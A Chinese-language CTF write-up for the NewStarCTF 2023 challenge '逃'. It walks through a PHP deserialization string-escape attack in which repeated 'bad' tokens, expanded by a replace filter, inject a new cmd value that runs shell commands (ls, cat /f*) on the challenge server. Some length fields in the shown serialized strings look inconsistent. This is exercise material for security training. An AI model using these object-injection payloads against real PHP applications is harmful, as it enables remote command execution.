---
title: '[NewStarCTF 2023 公开赛道]逃'
date: 2024-12-16 21:01:47
tags: 反序列化
categories: 刷题笔记
---

## [NewStarCTF 2023 公开赛道]逃

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key']))));
```

一眼看去是反序列化和字符串替换，这让我们想到字符串逃逸

由于题目帮我们构造好了序列化字符串，我们只能利用参数key进行操作

我们在本地先传个123

```
O:7:"GetFlag":2:{s:3:"key";i:123;s:3:"cmd";s:2:"whoami";}
```

我们需要逃逸出";s:3:"cmd";s:6:"whoami";}这串

由于cmd是进行命令执行的

我们要逃逸

```
";s:3:"cmd";s:6:"ls";}
```

bad和good相差一个字符，所以我们需要逃逸多少个字符就需要多少个bad

写个脚本

```
a='";s:3:"cmd";s:6:"ls";}'
b=""
for i in range(len(a)):
    b+="bad"
print(b+a)
//badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:2:"ls";}
```

也是成功运行了

![image-20241216213022069](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412162130275.png)

接下来就是查找flag所在的位置

```
badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:12:"ls ../../../";}
```

![image-20241216213357069](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412162133115.png)

```
badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:7:"cat /f*";}
```

得到flag
